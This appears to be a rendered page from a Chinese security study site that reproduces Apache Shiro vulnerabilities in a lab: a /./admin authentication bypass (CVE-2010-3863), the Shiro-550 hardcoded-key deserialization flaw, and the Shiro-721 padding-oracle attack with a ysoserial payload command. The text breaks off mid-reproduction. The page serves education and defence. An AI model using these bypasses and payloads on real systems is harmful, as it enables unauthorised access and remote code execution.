+    <nav class="md-nav" aria-label="Shiro-721反序列化漏洞（CVE-2019-12422）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      漏洞简介
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="漏洞简介">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#0x01" class="md-nav__link">
+    <span class="md-ellipsis">
+      0x01 首先讲一下面试官经常会问到的一个问题
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#0x02" class="md-nav__link">
+    <span class="md-ellipsis">
+      0x02 漏洞指纹
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#0x03" class="md-nav__link">
+    <span class="md-ellipsis">
+      0x03 漏洞介绍
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      漏洞原理
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      攻击流程
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#aes-128-cbc" class="md-nav__link">
+    <span class="md-ellipsis">
+      AES-128-CBC
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#padding-oracle-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      Padding Oracle Attack原理
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      漏洞复现
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="漏洞复现">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      1、拉取环境
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      2、攻击环节
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shiro-cve-2020-1957" class="md-nav__link">
+    <span class="md-ellipsis">
+      Shiro 认证绕过漏洞（CVE-2020-1957）
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Shiro 认证绕过漏洞（CVE-2020-1957）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      漏洞原理
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      漏洞复现
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="漏洞复现">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      1、权限配置
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      2、默认状态
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3poc" class="md-nav__link">
+    <span class="md-ellipsis">
+      3、绕过POC
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shiro-cve-2020-13933" class="md-nav__link">
+    <span class="md-ellipsis">
+      Shiro 身份验证绕过 （CVE-2020-13933）
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Shiro 身份验证绕过 （CVE-2020-13933）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      漏洞简介
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    <span class="md-ellipsis">
+      漏洞复现
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="漏洞复现">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      1、开启环境
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      2、正常访问敏感界面
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#33b" class="md-nav__link">
+    <span class="md-ellipsis">
+      3、通过%3b绕过，不触发身份验证并且绕过权限
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shiro-cve-2022-32532" class="md-nav__link">
+    <span class="md-ellipsis">
+      Shiro 授权绕过 （CVE-2022-32532）
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Shiro 授权绕过 （CVE-2022-32532）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    <span class="md-ellipsis">
+      漏洞简介
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    <span class="md-ellipsis">
+      漏洞概述
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    <span class="md-ellipsis">
+      影响范围
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    <span class="md-ellipsis">
+      利用流程
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E6%8C%96%E7%9F%BFXMR%E5%B8%81%20%E7%A8%8B%E5%BA%8F%EF%BC%88%E7%97%85%E6%AF%92%EF%BC%89%E5%8F%91%E7%8E%B0%E4%B8%8E%E6%B8%85%E9%99%A4/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    挖矿XMR币程序（病毒）发现与清除
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    永恒之蓝(ms_017)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86isecure%20center%20%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    海康威视isecure center综合安防管理平台存在任意文件上传漏洞
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E7%94%A8%E5%8F%8B-NC-Cloud%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    用友-NC-Cloud远程代码执行
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E7%BD%91%E7%A5%9ESecGate3600%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    网神SecGate3600 文件上传
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    网络协议分析
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8">
+            <span class="md-nav__icon md-icon"></span>
+            网络协议分析
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/HTTPS%20%20TLSv1.3/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTTPS && HTTPS 协议分析
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#apache-shiro-cve-2010-3863" class="md-nav__link">
+    <span class="md-ellipsis">
+      Apache Shiro 认证绕过漏洞（CVE-2010-3863）
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shiro-550cve-2016-4437" class="md-nav__link">
+    <span class="md-ellipsis">
+      Shiro-550反序列化漏洞（CVE-2016-4437）
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      漏洞简介
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      漏洞原理
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="漏洞原理">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#shiro_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      一、Shiro简介
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shiro_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      二、Shiro服务器识别身份加解密处理的流程
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="二、Shiro服务器识别身份加解密处理的流程">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1" class="md-nav__link">
+    <span class="md-ellipsis">
+      1、加密
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2" class="md-nav__link">
+    <span class="md-ellipsis">
+      2、解密
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#key" class="md-nav__link">
+    <span class="md-ellipsis">
+      三、Key
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      漏洞复现
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shiro-721cve-2019-12422" class="md-nav__link">
+    <span class="md-ellipsis">
+      Shiro-721反序列化漏洞（CVE-2019-12422）
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Shiro-721反序列化漏洞（CVE-2019-12422）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      漏洞简介
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="漏洞简介">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#0x01" class="md-nav__link">
+    <span class="md-ellipsis">
+      0x01 首先讲一下面试官经常会问到的一个问题
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#0x02" class="md-nav__link">
+    <span class="md-ellipsis">
+      0x02 漏洞指纹
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#0x03" class="md-nav__link">
+    <span class="md-ellipsis">
+      0x03 漏洞介绍
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      漏洞原理
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      攻击流程
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#aes-128-cbc" class="md-nav__link">
+    <span class="md-ellipsis">
+      AES-128-CBC
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#padding-oracle-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      Padding Oracle Attack原理
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      漏洞复现
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="漏洞复现">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      1、拉取环境
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      2、攻击环节
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shiro-cve-2020-1957" class="md-nav__link">
+    <span class="md-ellipsis">
+      Shiro 认证绕过漏洞（CVE-2020-1957）
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Shiro 认证绕过漏洞（CVE-2020-1957）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      漏洞原理
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      漏洞复现
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="漏洞复现">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      1、权限配置
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      2、默认状态
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3poc" class="md-nav__link">
+    <span class="md-ellipsis">
+      3、绕过POC
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shiro-cve-2020-13933" class="md-nav__link">
+    <span class="md-ellipsis">
+      Shiro 身份验证绕过 （CVE-2020-13933）
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Shiro 身份验证绕过 （CVE-2020-13933）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      漏洞简介
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    <span class="md-ellipsis">
+      漏洞复现
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="漏洞复现">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      1、开启环境
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      2、正常访问敏感界面
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#33b" class="md-nav__link">
+    <span class="md-ellipsis">
+      3、通过%3b绕过，不触发身份验证并且绕过权限
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shiro-cve-2022-32532" class="md-nav__link">
+    <span class="md-ellipsis">
+      Shiro 授权绕过 （CVE-2022-32532）
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Shiro 授权绕过 （CVE-2022-32532）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    <span class="md-ellipsis">
+      漏洞简介
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    <span class="md-ellipsis">
+      漏洞概述
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    <span class="md-ellipsis">
+      影响范围
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    <span class="md-ellipsis">
+      利用流程
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+<h1 id="shiro">Shiro 历史版本漏洞复现<a class="headerlink" href="#shiro" title="Permanent link">&para;</a></h1>
+<p><a href="https://www.cnblogs.com/YikJiang/p/17457353.html#0x01%20%E9%A6%96%E5%85%88%E8%AE%B2%E4%B8%80%E4%B8%8B%E9%9D%A2%E8%AF%95%E5%AE%98%E7%BB%8F%E5%B8%B8%E4%BC%9A%E9%97%AE%E5%88%B0%E7%9A%84%E4%B8%80%E4%B8%AA%E9%97%AE%E9%A2%98">一文读懂面试官都在问的Shiro漏洞</a></p>
+<h2 id="apache-shiro-cve-2010-3863">Apache Shiro 认证绕过漏洞（CVE-2010-3863）<a class="headerlink" href="#apache-shiro-cve-2010-3863" title="Permanent link">&para;</a></h2>
+<p>漏洞详情：
+Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。</p>
+<p>在Apache Shiro 1.1.0以前的版本中，shiro 进行权限验证前未对url 做标准化处理，攻击者可以构造/、//、/./、/…/ 等绕过权限验证</p>
+<p>复现：
+直接请求管理页面/admin，无法访问，将会被重定向到登录页面
+<img alt="image.png" src="https://s2.loli.net/2024/02/14/dtGZp4T3UI6Ngw1.png" />
+构造恶意请求/./admin，即可绕过权限校验，访问到管理页面
+<img alt="image.png" src="https://s2.loli.net/2024/02/14/vetmMLDRd93Fl5C.png" /></p>
+<h2 id="shiro-550cve-2016-4437">Shiro-550反序列化漏洞（CVE-2016-4437）<a class="headerlink" href="#shiro-550cve-2016-4437" title="Permanent link">&para;</a></h2>
+<hr />
+<h2 id="_1">漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>shiro-550主要是由shiro的rememberMe内容反序列化导致的命令执行漏洞，造成的原因是默认加密密钥是硬编码在shiro源码中，任何有权访问源代码的人都可以知道默认加密密钥。于是攻击者可以创建一个恶意对象，对其进行序列化、编码，然后将其作为cookie的rememberMe字段内容发送，Shiro 将对其解码和反序列化，导致服务器运行一些恶意代码。
+特征：cookie中含有rememberMe字段
+修复建议：</p>
+<ul>
+<li>更新shiro到1.2.4以上的版本。</li>
+<li>不使用默认的加密密钥，改为随机生成密钥。</li>
+</ul>
+<h2 id="_2">漏洞原理<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<h3 id="shiro_1">一、Shiro简介<a class="headerlink" href="#shiro_1" title="Permanent link">&para;</a></h3>
+<p>Apache Shiro 是一个强大易用的 Java 安全框架，提供了认证、授权、加密和会话管理等功能，对于任何一个应用程序，Shiro 都可以提供全面的安全管理服务。
+在Apache Shiro&lt;=1.2.4版本中AES加密时采用的key是**硬编码**在代码中的，于是我们就可以构造RememberMe的值，然后让其反序列化执行。</p>
+<p><img alt="" src="https://s2.loli.net/2024/02/14/xs1VJzEpr9QMZ4U.png" />
+Primary Cocnerns（基本关注点）:</p>
+<ul>
+<li>Authentication（认证）：经常和登录挂钩，是证明用户说他们是谁的一个工作</li>
+<li>Authorization（授权）：访问控制的过程，即，决定‘谁’可以访问‘什么</li>
+<li>Session Management（会话管理）：管理用户特定的会话，即使在非web或是EJB的应用中</li>
+<li>Crytography（加密）：通过加密算法保证数据的安全，且易于使用</li>
+</ul>
+<p>Supporting Features（辅助特性）:</p>
+<ul>
+<li>Web Support（网络支持）:web support API可以帮助在web应用中方便的使用shiro</li>
+<li>Caching（缓存）:保证安全操作使用快速有效</li>
+<li>Concurrency（并发）:支持多线程应用</li>
+<li>Testing（测试）：支持集成单元测试</li>
+<li>Run As（以..运行）：可以假定用户为另一个用户</li>
+<li>Remeber Me:记住用户，无需再次登录</li>
+</ul>
+<h3 id="shiro_2">二、Shiro服务器识别身份加解密处理的流程<a class="headerlink" href="#shiro_2" title="Permanent link">&para;</a></h3>
+<h4 id="1">1、加密<a class="headerlink" href="#1" title="Permanent link">&para;</a></h4>
+<ol>
+<li>用户使用账号密码进行登录，并勾选”Remember Me“。</li>
+<li>Shiro验证用户登录信息，通过后，查看用户是否勾选了”Remember Me“。</li>
+<li>若勾选，则将用户身份序列化，并将序列化后的内容进行AES加密，再使用base64编码。</li>
+<li>最后将处理好的内容放于cookie中的rememberMe字段。</li>
+</ol>
+<h4 id="2">2、解密<a class="headerlink" href="#2" title="Permanent link">&para;</a></h4>
+<ol>
+<li>当服务端收到来自未经身份验证的用户的请求时，会在客户端发送请求中的cookie中获取rememberMe字段内容。</li>
+<li>将获取到的rememberMe字段进行base64解码，再使用AES解密。</li>
+<li>最后将解密的内容进行反序列化，获取到用户身份。</li>
+</ol>
+<h3 id="key">三、Key<a class="headerlink" href="#key" title="Permanent link">&para;</a></h3>
+<p>AES加密的密钥Key被硬编码在代码里</p>
+<h3 id="_3">漏洞复现<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<p>攻击机IP：192.168.0.109
+靶机IP：192.168.72.128
+1、访问靶机
+<img alt="" src="https://s2.loli.net/2024/02/14/mgJS4Oixswk3ahc.png" />
+存在Remember me选项，尝试抓包
+<img alt="" src="https://s2.loli.net/2024/02/14/bBritHSsvVZMELa.png" />
+2、漏洞利用
+<a href="https://blog.csdn.net/Fighting_hawk/article/details/125562498">shiro反序列化漏洞综合利用工具v2.2</a>
+Github上工具很多，我们随便拿一款来进行验证
+<img alt="" src="https://s2.loli.net/2024/02/14/O7tNaQYse4GDhSl.png" />
+爆破密钥成功后，即可执行命令
+<img alt="" src="https://s2.loli.net/2024/02/14/cGTAFDB4E96Rlbd.png" /></p>
+<h2 id="shiro-721cve-2019-12422">Shiro-721反序列化漏洞（CVE-2019-12422）<a class="headerlink" href="#shiro-721cve-2019-12422" title="Permanent link">&para;</a></h2>
+<h3 id="_4">漏洞简介<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<h4 id="0x01">0x01 首先讲一下面试官经常会问到的一个问题<a class="headerlink" href="#0x01" title="Permanent link">&para;</a></h4>
+<p><strong>Shiro550和Shiro721的区别是什么</strong></p>
+<hr />
+<hr />
+<div class="highlight"><pre><span></span><code>Shiro550只需要通过碰撞key，爆破出来密钥，就可以进行利用
+ Shiro721的ase加密的key一般情况下猜不到，是系统随机生成的，并且当存在有效的用户信息时才会进入下一阶段的流程所以我们需要使用登录后的rememberMe Cookie，才可以进行下一步攻击
+</code></pre></div>
+<h4 id="0x02">0x02 漏洞指纹<a class="headerlink" href="#0x02" title="Permanent link">&para;</a></h4>
+<ul>
+<li>URL中含有Shiro字段</li>
+<li>cookie中含有rememberMe字段</li>
+<li>返回包中含有rememberMe</li>
+</ul>
+<h4 id="0x03">0x03 漏洞介绍<a class="headerlink" href="#0x03" title="Permanent link">&para;</a></h4>
+<p>在Shiro721中，Shiro通过AES-128-CBC对cookie中的rememberMe字段进行加密，所以用户可以通过Padding Oracle加密生成的攻击代码来构造恶意的rememberMe字段，进行反序列化攻击，需要执行的命令越复杂，生成payload需要的时间就越长。</p>
+<h3 id="_5">漏洞原理<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<p>由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，用有效的RememberMe cookie作为Padding Oracle Attack 的前缀，然后制作精心制作的RememberMe来执行Java反序列化攻击</p>
+<h3 id="_6">攻击流程<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
+<p>登录网站，并从cookie中获取RememberMe。使用RememberMe cookie作为Padding Oracle Attack的前缀。加密syserial的序列化有效负载，以通过Padding Oracle Attack制作精心制作的RememberMe。请求带有新的RememberMe cookie的网站，以执行反序列化攻击。攻击者无需知道RememberMe加密的密码密钥。</p>
+<h3 id="aes-128-cbc">AES-128-CBC<a class="headerlink" href="#aes-128-cbc" title="Permanent link">&para;</a></h3>
+<p>属于AES加密算法的CBC模式，使用128位数据块为一组进行加密解密，即16字节明文，对应16字节密文，，明文加密时，如果数据不够16字节，则会将数据补全剩余字节</p>
+<ul>
+<li>若最后剩余的明文不够16字节，需要进行填充，通常采用PKCS7进行填充。比如最后缺3个字节，则填充3个字节的0x03;若最后缺10个字节，则填充10个字节的0x0a;</li>
+<li>若明文正好是16个字节的整数倍，最后要再加入一个16字节0x10的组再进行加密</li>
+</ul>
+<h3 id="padding-oracle-attack">Padding Oracle Attack原理<a class="headerlink" href="#padding-oracle-attack" title="Permanent link">&para;</a></h3>
+<p>Padding Oracle攻击可以在没有密钥的情况下加密或解密密文
+Shiro Padding Oracle Attack（Shiro填充Oracle攻击）是一种针对Apache Shiro身份验证框架的安全漏洞攻击。Apache Shiro是Java应用程序中广泛使用的身份验证和授权框架，用于管理用户会话、权限验证等功能。
+Padding Oracle Attack（填充Oracle攻击）是一种针对加密算法使用填充的安全漏洞攻击。在加密通信中，填充用于将明文数据扩展到加密算法块大小的倍数。在此攻击中，攻击者利用填充的响应信息来推断出加密算法中的秘密信息。
+Shiro Padding Oracle Attack利用了Shiro框架中的身份验证过程中的一个漏洞，该漏洞允许攻击者通过填充信息的不同响应时间来确定身份验证过程中的错误。通过不断尝试不同的填充方式，攻击者可以逐步推断出加密秘钥，并最终获取访问权限。
+这种攻击利用了填充错误的身份验证响应来获取关于秘密信息的信息泄漏，然后根据这些信息进行进一步的攻击。为了防止Shiro Padding Oracle Attack，建议及时更新Apache Shiro版本，确保已修复该漏洞，并采取其他安全措施，如使用安全的加密算法和密钥管理策略。</p>
+<h2 id="_7">漏洞复现<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h2>
+<h3 id="1_1">1、拉取环境<a class="headerlink" href="#1_1" title="Permanent link">&para;</a></h3>
+<p><img alt="" src="https://s2.loli.net/2024/02/14/wVMg9XWTnLrIhqF.png" />
+环境启动完成后,在本地浏览器访问靶场地址:your-ip:8080
+<img alt="" src="https://s2.loli.net/2024/02/14/mWiqCVKeaUyzE6L.png" /></p>
+<h3 id="2_1">2、攻击环节<a class="headerlink" href="#2_1" title="Permanent link">&para;</a></h3>
+<p>0x01 登录成功后，我们从Cookie中获取到rememberMe字段的值
+<img alt="" src="https://s2.loli.net/2024/02/14/AW4oUkCY9sHGaP3.png" />
+0x02 使用ysoserial生成Payload
+ java -jar ysoserial.jar CommonsCollections1 "touch /tmp/YikJiang" &gt; payload.class
+<img alt="" src="https://s2.loli.net/2024/02/14/5YC7v9xaTPkBGce.png" />
+0x03 使用rememberMe值作为prefix，加载Payload，进行Padding Oracle攻击。</p>
